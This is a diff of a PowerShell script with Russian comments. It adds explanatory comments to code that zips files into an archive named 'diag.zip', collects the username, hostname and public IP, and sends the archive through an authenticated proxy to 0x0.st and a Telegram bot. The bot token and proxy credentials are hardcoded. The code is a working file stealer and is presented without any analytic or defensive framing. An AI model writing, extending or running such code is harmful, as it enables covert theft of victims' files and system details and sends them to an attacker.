@@ -5,24 +5,26 @@
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
 $chatId   = "8620709143"
 
-# Прокси с явной авторизацией
+# Прокси с явными учётными данными (если нужны)
 $proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
 
+# Универсальная функция для отправки сообщений в Telegram
 function Send-TelegramMessage {
     param($text)
     $url = "https://api.telegram.org/bot$botToken/sendMessage"
     $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json
     $wc = New-Object System.Net.WebClient
-    $wc.Proxy = $proxy
+    $wc.Proxy = $proxy  # <-- Прокси применён
     $wc.Headers.Add("Content-Type", "application/json")
     $wc.UploadString($url, "POST", $body) | Out-Null
 }
 
+# Функция загрузки на 0x0.st
 function Upload-To0x0 {
     param($filePath)
     $wc = New-Object System.Net.WebClient
-    $wc.Proxy = $proxy
+    $wc.Proxy = $proxy  # <-- Прокси применён
     $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
     return [System.Text.Encoding]::UTF8.GetString($response).Trim()
 }
@@ -45,12 +47,12 @@ try {
     $zip = "$env:TEMP\diag.zip"
     Compress-Archive -Path $paths -DestinationPath $zip -Force
 
-    # 4. Сбор информации
+    # 4. Сбор информации о системе
     $user = $env:USERNAME
     $comp = $env:COMPUTERNAME
+    # IP получаем через прокси
     $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
     $caption = "$user@$comp | IP: $ip"
-
     $size = (Get-Item $zip).Length
 
     # 5. Отправка
@@ -58,6 +60,7 @@ try {
         $link = Upload-To0x0 -filePath $zip
         Send-TelegramMessage "$caption`nDownload: $link"
     } else {
+        # Маленький файл — отправляем напрямую (multipart/form-data)
         $bytes = [System.IO.File]::ReadAllBytes($zip)
         $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
         $multipart = @()
@@ -74,7 +77,7 @@ try {
         $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
         $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
         $wc = New-Object System.Net.WebClient
-        $wc.Proxy = $proxy
+        $wc.Proxy = $proxy  # <-- Прокси применён
         foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
         $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
         $wc.UploadData($url, "POST", $data) | Out-Null
